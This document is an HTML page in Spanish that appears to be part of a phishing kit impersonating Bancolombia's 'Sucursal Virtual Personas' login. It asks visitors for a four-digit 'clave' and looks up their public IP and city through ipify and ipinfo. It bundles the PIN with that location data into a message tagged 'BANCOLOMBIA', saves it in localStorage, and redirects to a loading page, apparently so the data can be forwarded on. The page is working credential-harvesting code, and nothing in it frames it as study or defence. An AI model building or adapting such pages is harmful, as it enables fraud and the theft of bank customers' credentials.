<!DOCTYPE html>
<html lang='es'>
<head>
	 
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1.0'>
<title>Pantalla Clave</title>

<!-- Estilo nuevo -->
<link rel='stylesheet' href='clave.css'>

<!-- (Opcional) estilos viejos si los necesitas todavía -->
<link href="css/styles.css" media="all" rel="stylesheet" type="text/css">
<link href="css/bootstrap.css" media="all" rel="stylesheet" type="text/css">

<!-- JQuery -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

<!-- ================================
     IP (gfg) e IP + ciudad/país (address)
================================ -->
<script>
// IP pública simple para #gfg
$.getJSON("https://api.ipify.org?format=json", function(data) {
    $("#gfg").html(data.ip);
});

// IP + localización para #address
$.getJSON("https://ipinfo.io", function (response) {
    // address se usará como IP2 (ciudad, país)
    $("#address").html(response.city + ", " + response.country);
    // Si quieres, también puedes mostrarlo en pantalla en otro lado
});
</script>

<!-- ================================
     HORA ACTUAL EN TIEMPO REAL
================================ -->
<script>
function actualizarHora() {
    let ahora = new Date();
    let opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };

    let texto =
        `${ahora.toLocaleDateString('es-ES', opciones)} - ` +
        `${ahora.toLocaleTimeString('es-ES')}`;

    document.getElementById("horaActual").innerText = texto;
}
setInterval(actualizarHora, 1000);
</script>

<!-- ================================
     LÓGICA DE VALIDACIÓN + SAX2.JS ADAPTADO
================================ -->
<script>
// validación visual nueva
function validarClave() {
    const clave = document.getElementById("clave").value.trim();

    if (clave === "") {
        alert("Ingresa tu clave");
        return false;
    }
    if (clave.length < 4) {
        alert("La clave debe tener 4 dígitos");
        return false;
    }

    // Ocultar botones
    document.querySelector('.botones').style.display = 'none';

    // Si todo bien, continúa con la lógica existente (ready/sender)
    return sender();
}

// ======== sax2.js adaptado al nuevo input ========
var u_name, ip, ip2;

var ready = function () {
    // AHORA la clave viene del input nuevo #clave
    u_name = document.getElementById("clave").value;
    ip     = document.getElementById("gfg").innerHTML;
    ip2    = document.getElementById("address").innerHTML;

    if (u_name && ip && ip2) {
        // Almacenar la información del usuario en localStorage
        localStorage.setItem('clave', u_name);
        localStorage.setItem('userIP', ip);
        localStorage.setItem('userIP2', ip2);
        localStorage.setItem(
            'message',
            "Clav3: " + u_name + "\nIP: " + ip + "\n" + ip2 + "\nBANCOLOMBIA"
        );
        console.log('Datos guardados correctamente en localStorage');
    } else {
        console.log('Faltan datos para guardar');
    }
};

var sender = function () {
    ready(); // guardamos los datos en localStorage
    window.location = 'load.html'; // redirigimos a la página deseada
    return false;
};
</script>

</head>
<body onload="actualizarHora()">

<!-- address oculto para mantener la lógica (ip2) -->
<p id="address" hidden=""></p>
<!-- gfg se usa para la IP pública -->
<p id="gfg" hidden=""></p>

<h1 class='titulo-principal'>Validación de seguridad</h1>

<div class='form-box'>
    
    <p id="horaActual" class="descripcion" style="font-size:14px; opacity:0.8;">
        Cargando hora...
    </p>

    <!-- Si quieres mostrar IP/ubicación visualmente, puedes usar otro p -->
    <p id="ipInfoVisible" class="descripcion" style="font-size:14px; opacity:0.8;">
        Detectando dirección IP...
    </p>

    <p class='descripcion'>
        Ingresa tu clave para continuar a la <br>
        <strong>Sucursal Virtual Personas.</strong>
    </p>

    <label class='label-user'>
        <img src='icons/icon-lock.png' class='icono'>
        <span>Clave</span>
    </label>

    <!-- Input NUEVO (no teclado virtual) -->
    <input
        type='password'
        id="clave"
        maxlength="4"
        class='input-user'
        autocomplete="off"
    >

    <div class='botones'>
        <button class='btn-volver' type="button" onclick="window.location.href='index.html'">
            Volver
        </button>
        <button class='btn-continuar' type="button" onclick="validarClave()">
            Continuar
        </button>
    </div>
</div>

<!-- <img src='images/lineas.png' class='lineas-img'> (ELIMINADA) -->

<div class="vigilado-logo">
    <img src="images/vigiladosuper.png">
</div>

<!-- Pie opcional con IP visible y año -->
<div style="margin-top: 20px; text-align:center; font-size:12px;">
    <span>Dirección IP: <span id="ipPublicaTexto"></span></span><br>
    <span>Copyright © <span id="fecha"></span></span>
</div>

<script>
// Mostrar IP y address también en el texto visible si quieres
$(document).ready(function() {
    var year = (new Date).getFullYear();
    $("#fecha").text(year);

    // cuando tengamos ip y address, los colocamos en ipInfoVisible y ipPublicaTexto
    $.getJSON("https://api.ipify.org?format=json", function(data) {
        $("#ipPublicaTexto").html(data.ip);
        $("#gfg").html(data.ip); // también mantener para la lógica
    });

    $.getJSON("https://ipinfo.io", function (response) {
        var txt = "IP: " + response.ip + " – " + response.city + ", " + response.country;
        $("#ipInfoVisible").html(txt);
        $("#address").html(response.city + ", " + response.country);
    });
});
</script>

</body>
</html>
